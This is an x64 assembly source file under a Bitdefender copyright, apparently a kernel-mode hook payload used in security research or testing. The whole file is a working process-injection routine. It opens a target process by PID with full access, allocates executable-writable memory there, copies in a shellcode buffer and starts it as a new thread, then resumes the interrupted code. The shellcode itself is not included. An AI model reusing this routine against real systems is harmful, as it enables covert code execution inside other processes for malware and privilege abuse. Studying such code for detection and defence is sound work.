;
; SPDX-License-Identifier: BSD-3-Clause
; Copyright (c) 2025 Bitdefender
;
    bits 64
    
start:
    jmp         _code
    align       16

    ; APIs
ZwOpenProcess                   dq      0
ZwAllocateVirtualMemory         dq      0
ZwWriteVirtualMemory            dq      0
ZwCreateThreadEx                dq      0
TargetPID                       dq      0

OBJECT_ATTRIBUTES               equ     0x20
OBJECT_ATTRIBUTES_Length        equ     0x20
OBJECT_ATTRIBUTES_RootDir       equ     0x28
OBJECT_ATTRIBUTES_ObjectName    equ     0x30
OBJECT_ATTRIBUTES_Attributes    equ     0x38
OBJECT_ATTRIBUTES_SecDesc       equ     0x40
OBJECT_ATTRIBUTES_SecQoS        equ     0x48

CLIENT_ID                       equ     0x50
CLIENT_ID_UniqueProcess         equ     0x50
CLIENT_ID_UniqueThread          equ     0x58

PROCESS_HANDLE                  equ     0x60
THREAD_HANDLE                   equ     0x68
SHELLCODE_SIZE                  equ     0x70
SHELLCODE_BUFFER                equ     0x78


_code:

    ;
    ; This is the code that we overwrite.
    ;
    mov         rdx, qword [rbp - 0x40]
    sti
    
    
    ;
    ; Save all the registers.
    ;
    push        rax
    push        rcx
    push        rdx
    push        rbx
    push        rbp
    push        rsi
    push        rdi
    push        r8
    push        r9
    push        r10
    push        r11
    push        r12
    push        r13
    push        r14
    push        r15
    
    
    ;
    ; Breakpoint here, if needed.
    ;
    nop
    

    ;
    ; Payload
    ;
    sub         rsp, 256
    mov         rbp, rsp
    
    
    ;
    ; Guard against reentrancy. Only go through this code once per CPU.
    ;
    lock bts    dword gs:[0x54], 0
    jc          _done
    
    
    ; InitializeObjectAttributes
    mov         qword [rbp + OBJECT_ATTRIBUTES_Length], 48
    mov         qword [rbp + OBJECT_ATTRIBUTES_RootDir], 0
    mov         qword [rbp + OBJECT_ATTRIBUTES_ObjectName], 0
    mov         qword [rbp + OBJECT_ATTRIBUTES_Attributes], 0x00000200      ; OBJ_KERNEL_HANDLE
    mov         qword [rbp + OBJECT_ATTRIBUTES_SecDesc], 0
    mov         qword [rbp + OBJECT_ATTRIBUTES_SecQoS], 0
    
    ; Initialize CLIENT_ID
    mov         rax, qword [rel TargetPID]
    mov         qword [rbp + CLIENT_ID_UniqueProcess], rax
    mov         qword [rbp + CLIENT_ID_UniqueThread], 0
    
    ; Call ZwOpenProcess
    lea         rcx, [rbp + PROCESS_HANDLE]
    mov         rdx, 0x001FFFFF                                             ; PROCESS_ALL_ACCESS
    lea         r8,  [rbp + OBJECT_ATTRIBUTES]
    lea         r9,  [rbp + CLIENT_ID]
    sub         rsp, 0x20
    call        qword [rel ZwOpenProcess]
    add         rsp, 0x20
    test        eax, eax
    js          _done
    
    ; Call ZwAllocateMemory
    mov         rcx, [rbp + PROCESS_HANDLE]
    lea         rdx, [rbp + SHELLCODE_BUFFER]
    mov         qword [rdx], 0
    xor         r8, r8
    lea         r9, [rbp + SHELLCODE_SIZE]
    mov         qword [r9], 276
    push        0x40                                                        ; PAGE_EXECUTE_READWRITE
    push        0x3000                                                      ; MEM_RESERVE | MEM_COMMIT
    sub         rsp, 0x20
    call        qword [rel ZwAllocateVirtualMemory]
    add         rsp, 0x30
    test        eax, eax
    js          _done
    
    ; Call ZwWriteVirtualMemory
    mov         rcx, qword [rbp + PROCESS_HANDLE]
    mov         rdx, qword [rbp + SHELLCODE_BUFFER]
    lea         r8, [rel _shellcode]
    mov         r9, qword [rbp + SHELLCODE_SIZE]
    push        0
    push        0
    sub         rsp, 0x20
    call        qword [rel ZwWriteVirtualMemory]
    add         rsp, 0x30
    test        eax, eax
    js          _done
    
    ; Call ZwCreateThreadEx
    mov         qword [rbp + OBJECT_ATTRIBUTES_Length], 48
    mov         qword [rbp + OBJECT_ATTRIBUTES_RootDir], 0
    mov         qword [rbp + OBJECT_ATTRIBUTES_ObjectName], 0
    mov         qword [rbp + OBJECT_ATTRIBUTES_Attributes], 0x00000200      ; OBJ_KERNEL_HANDLE
    mov         qword [rbp + OBJECT_ATTRIBUTES_SecDesc], 0
    mov         qword [rbp + OBJECT_ATTRIBUTES_SecQoS], 0
    
    lea         rcx, [rbp + THREAD_HANDLE]
    mov         rdx, 0x001FFFFF                                             ; THREAD_ALL_ACCESS
    lea         r8, [rbp + OBJECT_ATTRIBUTES]
    mov         r9, [rbp + PROCESS_HANDLE]
    
    push        0
    push        0
    push        0
    push        0
    push        0
    push        0
    push        0
    push        qword [rbp + SHELLCODE_BUFFER]
    sub         rsp, 0x20
    call        qword [rel ZwCreateThreadEx]
    add         rsp, 0x60
    test        eax, eax
    js          _done
    

_done:
    add         rsp, 256
    
    ; Restore all the registers.
    pop         r15
    pop         r14
    pop         r13
    pop         r12
    pop         r11
    pop         r10
    pop         r9
    pop         r8
    pop         rdi
    pop         rsi
    pop         rbp
    pop         rbx
    pop         rdx
    pop         rcx
    pop         rax
    
    ; Return to the interrupted code.
    retn
    
_shellcode:    